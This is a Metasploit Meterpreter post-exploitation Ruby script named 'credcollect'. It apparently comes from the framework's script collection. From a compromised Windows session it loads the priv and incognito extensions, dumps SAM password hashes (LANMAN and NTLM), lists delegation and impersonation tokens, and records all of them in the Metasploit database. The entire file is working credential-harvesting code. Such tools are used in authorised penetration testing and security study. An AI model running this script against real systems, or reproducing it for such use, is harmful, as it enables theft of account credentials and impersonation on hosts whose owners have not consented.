# $Id$
# credcollect - tebo[at]attackresearch.com

opts = Rex::Parser::Arguments.new(
	"-h" => [ false,"Help menu." ]
)

opts.parse(args) { |opt, idx, val|
	case opt
	when "-h"
		print_line("CredCollect -- harvest credentials found on the host and store them in the database")
		print_line("USAGE: run credcollect")
		print_line(opts.usage)
		raise Rex::Script::Completed
	end
}

# No sense trying to grab creds if we don't have any place to put them
if !client.framework.db.active
	raise RuntimeError, "Database not connected. Run db_connect first."
end


# Make sure we're rockin Priv and Incognito
client.core.use("priv") if not extensions.include?("priv")
client.core.use("incognito") if not extensions.include?("incognito")

# It wasn't me mom! Stinko did it!
hashes = client.priv.sam_hashes

# Target infos for the db record
addr = client.sock.peerhost
host = client.framework.db.find_or_create_host(:host => addr, :state => Msf::HostState::Alive)

# Record hashes to the running db instance
hashes.each do |hash|
	data = {}
	data[:host]  = host
	data[:proto] = 'smb'
	data[:user]  = hash.user_name
	data[:hash]  = hash.lanman + ":" + hash.ntlm
	data[:target_host]   = host.address
	data[:hash_string] = hash.hash_string

	client.framework.db.report_auth_info(data)
end

# Record user tokens
tokens = client.incognito.incognito_list_tokens(0)
raise Rex::Script::Completed if not tokens

# Meh, tokens come to us as a formatted string
(tokens["delegation"] + tokens["impersonation"]).split("\n").each do |token|
	data = {}
	data[:host]      = host
	data[:proto]     = 'smb'
	data[:token]     = token
	data[:target_host] = host.address

	client.framework.db.report_auth_info(data)
end

